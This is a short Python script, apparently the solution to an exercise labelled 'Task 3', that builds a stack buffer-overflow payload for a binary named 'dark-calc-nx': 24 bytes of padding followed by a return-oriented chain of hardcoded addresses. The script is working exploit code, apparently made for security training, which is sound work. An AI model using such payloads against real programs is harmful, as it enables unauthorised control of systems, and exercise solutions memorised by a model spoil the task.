#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.
"""
import sys
import struct

pad = b"A" * 24
chain = struct.pack("<Q", 0x401a33) + struct.pack("<Q", 4) + struct.pack("<Q", 0x401978)
payload = pad + chain + b"\n"

sys.stdout.buffer.write(payload)
